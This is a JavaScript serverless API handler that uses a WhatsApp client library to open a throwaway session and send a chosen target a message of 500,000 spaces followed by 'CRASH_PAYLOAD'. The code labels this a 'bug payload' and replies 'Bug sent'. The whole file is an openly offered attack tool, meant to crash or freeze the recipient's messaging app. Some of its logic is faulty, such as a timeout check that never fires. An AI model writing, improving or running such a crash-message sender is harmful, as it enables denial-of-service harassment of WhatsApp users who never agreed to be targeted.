// api/index.js
const { default: makeWASocket, useMultiFileAuthState } = require('@whatsapp/baileys');

export const config = {
  api: {
    bodyParser: true,
  },
};

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { target, type } = req.body;

  if (!target || !type) {
    return res.status(400).json({ success: false, message: 'Invalid input' });
  }

  try {
    // Create temporary session
    const { state, saveCreds } = await useMultiFileAuthState('temp_' + Math.random());
    
    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      browser: ['Chrome (Linux)', '', ''],
    });

    // Set timeout for connection
    const connectionTimeout = setTimeout(() => {
      sock.end({ reason: 'timeout' });
    }, 15000);

    sock.ev.on('connection.update', async (update) => {
      const { connection } = update;
      if (connection === 'open') {
        clearTimeout(connectionTimeout);
        
        // Send bug payload
        const messageContent = { text: " ".repeat(500000) + "CRASH_PAYLOAD" };
        await sock.sendMessage(target, messageContent);
        
        await sock.logout();
        clearTimeout(connectionTimeout);
        
        return res.status(200).json({ success: true, message: 'Bug sent' });
      }
    });

    sock.ev.on('creds.update', saveCreds);

    // Timeout handler
    setTimeout(() => {
      if (!sock) {
        return res.status(500).json({ success: false, message: 'Connection timeout' });
      }
    }, 20000);

  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
}
